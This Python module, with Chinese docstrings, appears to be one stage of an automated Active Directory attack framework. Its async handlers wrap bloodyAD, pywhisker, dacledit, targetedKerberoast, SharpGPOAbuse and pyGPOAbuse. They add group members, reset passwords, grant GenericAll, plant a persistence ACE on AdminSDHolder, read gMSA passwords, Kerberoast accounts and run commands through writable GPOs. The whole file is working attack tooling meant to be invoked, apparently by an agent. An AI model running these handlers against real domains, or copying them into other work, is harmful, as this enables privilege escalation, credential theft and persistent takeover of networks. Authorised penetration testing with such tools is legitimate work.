"""ACL 阶段工具 handler：bloodyad / pywhisker / dacledit / GPO 滥用。"""

from __future__ import annotations

from typing import Any

from .executor import CommandBuilder, exec_builder, precheck


def _bloodyad(args: dict) -> CommandBuilder:
    """bloodyad 基础命令（含认证）。"""
    cb = CommandBuilder("bloodyad")
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("hash"):
        cb.args("-p", ":" + str(args["hash"]))
    elif args.get("password"):
        cb.args("-p", str(args["password"]))
    if args.get("target"):
        cb.args("--host", str(args["target"]))
    return cb


def _domain_to_dn(domain: str) -> str:
    """domain.com -> DC=domain,DC=com。"""
    if not domain:
        return ""
    return ",".join(f"DC={p}" for p in domain.split("."))


def _impacket_auth(args: dict) -> list:
    """impacket 通用认证 -d/-u/-p/-hashes。"""
    out: list = []
    if args.get("domain"):
        out += ["-d", str(args["domain"])]
    if args.get("username"):
        out += ["-u", str(args["username"])]
    if args.get("hash"):
        out += ["-hashes", f":{args['hash']}"]
    elif args.get("password"):
        out += ["-p", str(args["password"])]
    return out


async def bloodyad_add_group_member(args: dict, state: Any = None) -> str:
    """bloodyad 添加组成员。"""
    err, args = precheck("bloodyad_add_group_member", args, state)
    if err:
        return err
    cb = _bloodyad(args).args("add", "groupMember", str(args.get("group", "")), str(args.get("member", "")))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def bloodyad_set_password(args: dict, state: Any = None) -> str:
    """bloodyad 重置用户密码。"""
    err, args = precheck("bloodyad_set_password", args, state)
    if err:
        return err
    cb = _bloodyad(args).args("set", "password", str(args.get("user", "")), str(args.get("new_password", "")))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def bloodyad_add_genericall(args: dict, state: Any = None) -> str:
    """bloodyad 对目标授予 GenericAll 权限。"""
    err, args = precheck("bloodyad_add_genericall", args, state)
    if err:
        return err
    cb = _bloodyad(args).args("add", "genericAll", str(args.get("target_dn", "")), str(args.get("principal", "")))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def adminsd_holder_add_ace(args: dict, state: Any = None) -> str:
    """在 AdminSDHolder 容器上添加 ACE（持久化提权）。"""
    err, args = precheck("adminsd_holder_add_ace", args, state)
    if err:
        return err
    base_dn = _domain_to_dn(args.get("domain", ""))
    sdholder_dn = f"CN=AdminSDHolder,CN=System,{base_dn}" if base_dn else "CN=AdminSDHolder,CN=System"
    right = args.get("right") or "genericAll"
    cb = _bloodyad(args).args("add", right, sdholder_dn, str(args.get("principal", ""))).timeout_secs(120)
    return await exec_builder(cb)


async def gmsa_read_password_bloodyad(args: dict, state: Any = None) -> str:
    """bloodyad 读取 gMSA 账户密码。"""
    err, args = precheck("gmsa_read_password_bloodyad", args, state)
    if err:
        return err
    cb = _bloodyad(args).args("readGMSAPassword", str(args.get("gmsa_account", ""))).timeout_secs(120)
    return await exec_builder(cb)


async def pywhisker(args: dict, state: Any = None) -> str:
    """pywhisker 管理 gMSA 凭证（add/list/delete）。"""
    err, args = precheck("pywhisker", args, state)
    if err:
        return err
    cb = CommandBuilder("pywhisker.py")
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("hash"):
        cb.args("--hash", str(args["hash"]))
    elif args.get("password"):
        cb.args("-p", str(args["password"]))
    if args.get("target"):
        cb.args("--dc-ip", str(args["target"]))
    cb.args("--action", str(args.get("action", "list")))
    if args.get("target_account"):
        cb.args("--target", str(args["target_account"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def targeted_kerberoast(args: dict, state: Any = None) -> str:
    """targetedKerberoast 对指定目标进行 Kerberoasting。"""
    err, args = precheck("targeted_kerberoast", args, state)
    if err:
        return err
    cb = CommandBuilder("targetedKerberoast").args("--dc-ip", str(args.get("target", "")))
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("hash"):
        cb.args("-H", str(args["hash"]))
    elif args.get("password"):
        cb.args("-p", str(args["password"]))
    targets = args.get("targets")
    if targets:
        if isinstance(targets, (list, tuple)):
            targets = ",".join(str(t) for t in targets)
        cb.args("--target", str(targets))
    cb.timeout_secs(300)
    return await exec_builder(cb)


async def dacl_edit(args: dict, state: Any = None) -> str:
    """dacledit.py 编辑对象 DACL。"""
    err, args = precheck("dacl_edit", args, state)
    if err:
        return err
    cb = CommandBuilder("dacledit.py")
    if args.get("action"):
        cb.args("-action", str(args["action"]))
    if args.get("target_dn"):
        cb.args("-target", str(args["target_dn"]))
    if args.get("principal"):
        cb.args("-principal", str(args["principal"]))
    if args.get("right"):
        cb.args("-rights", str(args["right"]))
    cb.args(*_impacket_auth(args))
    if args.get("target"):
        cb.args("-dc-ip", str(args["target"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def sharpgpoabuse(args: dict, state: Any = None) -> str:
    """SharpGPOAbuse 通过可写 GPO 下发本地管理员/计划任务 payload。"""
    err, args = precheck("sharpgpoabuse", args, state)
    if err:
        return err
    cb = CommandBuilder("sharpgpoabuse")
    if args.get("gpo_name"):
        cb.args("--gpo-name", str(args["gpo_name"]))
    cb.args("--powershell")
    if args.get("command"):
        cb.args("--command", str(args["command"]))
    if args.get("domain"):
        cb.args("--domain", str(args["domain"]))
    if args.get("username"):
        cb.args("--user", str(args["username"]))
    if args.get("password"):
        cb.args("--password", str(args["password"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def pygpoabuse_immediate_task(args: dict, state: Any = None) -> str:
    """pyGPOAbuse 在 GPO 中创建立即执行的计划任务。"""
    err, args = precheck("pygpoabuse_immediate_task", args, state)
    if err:
        return err
    cb = CommandBuilder("pygpoabuse")
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("password"):
        cb.args("-p", str(args["password"]))
    if args.get("gpo_dn"):
        cb.args(str(args["gpo_dn"]))
    if args.get("command"):
        cb.args("--command", str(args["command"]))
    if args.get("task_name"):
        cb.args("--task-name", str(args["task_name"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


__all__ = [
    "bloodyad_add_group_member", "bloodyad_set_password", "bloodyad_add_genericall",
    "adminsd_holder_add_ace", "gmsa_read_password_bloodyad", "pywhisker",
    "targeted_kerberoast", "dacl_edit", "sharpgpoabuse", "pygpoabuse_immediate_task",
]
